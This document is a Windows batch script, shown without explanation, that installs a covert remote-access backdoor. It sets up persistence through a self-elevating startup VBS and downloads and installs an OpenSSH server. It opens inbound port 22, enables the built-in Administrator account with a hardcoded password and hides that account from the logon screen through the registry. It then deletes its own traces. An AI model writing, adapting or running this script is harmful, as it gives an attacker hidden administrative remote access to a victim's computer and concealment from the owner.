    
cls
@echo off
if exist "%programdata%\tmpsession" for /f %%a in (%programdata%\tmpsession) do set num=%%a & goto skip
set num=%random%
echo %num% > "%programdata%\tmpsession"
:skip
if exist "%programdata%\%num%.ps1" del /q "%programdata%\%num%.ps1"
if exist "%programdata%\%num%.bat" del /q "%programdata%\%num%.bat"
if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\%num%.vbs" del /q "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\%num%.vbs"
echo Invoke-WebRequest -Uri 'https://github.com/PowerShell/Win32-OpenSSH/releases/download/v9.2.2.0p1-Beta/OpenSSH-Win64.zip' -OutFile '%programdata%\OpenSSH.zip'> "%programdata%\%num%.ps1"
echo Expand-Archive '%programdata%\OpenSSH.zip' -DestinationPath '%systemdrive%\Program Files\OpenSSH'>> "%programdata%\%num%.ps1"
echo cd "%systemdrive%\Program Files\OpenSSH\OpenSSH-Win64">> "%programdata%\%num%.ps1"
echo powershell.exe -ExecutionPolicy Bypass -File ".\install-sshd.ps1">> "%programdata%\%num%.ps1"
echo del /q "%programdata%\OpenSSH.zip">> "%programdata%\%num%.ps1"
echo Start-Service sshd >> "%programdata%\%num%.ps1"
echo Set-Service -Name sshd -StartupType 'Automatic' >> "%programdata%\%num%.ps1"
echo if (!(Get-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -ErrorAction SilentlyContinue ^| Select-Object Name, Enabled)) {Write-Output "Firewall Rule 'OpenSSH-Server-In-TCP' does not exist, creating it..." >> "%programdata%\%num%.ps1"
echo New-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22} else {Write-Output "Firewall rule 'OpenSSH-Server-In-TCP' has been created and exists."} >> "%programdata%\%num%.ps1"
echo set error=0 >"%programdata%\%num%.bat"
echo :loop >>"%programdata%\%num%.bat"
echo if %%error%%==15 exit >> "%programdata%\%num%.bat"
echo for /f %%%%a in ('powershell -command "Test-Connection -ComputerName www.github.com -Quiet"') do (if not "%%%%a"=="True" set /a error=error+1 ^& timeout 20 ^& goto loop) >>"%programdata%\%num%.bat"
echo taskkill /f /im powershell.exe >>"%programdata%\%num%.bat"
echo powershell.exe -ExecutionPolicy Bypass -File "%programdata%\%num%.ps1">>"%programdata%\%num%.bat"
echo net user Administrator /active:yes>>"%programdata%\%num%.bat"
echo net user Administrator 55991133>>"%programdata%\%num%.bat"
echo reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /t REG_DWORD /f /d 0 /v Administrator>>"%programdata%\%num%.bat"
echo netsh advfirewall firewall set rule group="Network Discovery" new enable=Yes>>"%programdata%\%num%.bat"
echo if not exist "%ProgramFiles%\OpenSSH" exit >>"%programdata%\%num%.bat"
echo del /q "%programdata%\OpenSSH.zip" ^& del /q "%programdata%\%num%.ps1" ^& del /q "%programdata%\tmpsession" ^& del /q "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\%num%.vbs" ^& del /q "%programdata%\%num%.bat" >>"%programdata%\%num%.bat"
echo If Not WScript.Arguments.Named.Exists("elevate") Then>"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\%num%.vbs"
echo   CreateObject("Shell.Application").ShellExecute WScript.FullName _>>"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\%num%.vbs"
echo     , """" ^& WScript.ScriptFullName ^& """ /elevate", "", "runas", ^1>>"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\%num%.vbs"
echo   WScript.Quit>>"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\%num%.vbs"
echo End If>>"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\%num%.vbs"
echo Set WshShell = CreateObject("WScript.Shell")>>"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\%num%.vbs"
echo WshShell.Run """" ^& "%programdata%\%num%.bat" ^& """" ^& sargs, 0, False>>"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\%num%.vbs"
echo Set WshShell = Nothing>>"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\%num%.vbs"
%systemdrive%
cd "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
start %num%.vbs
exit
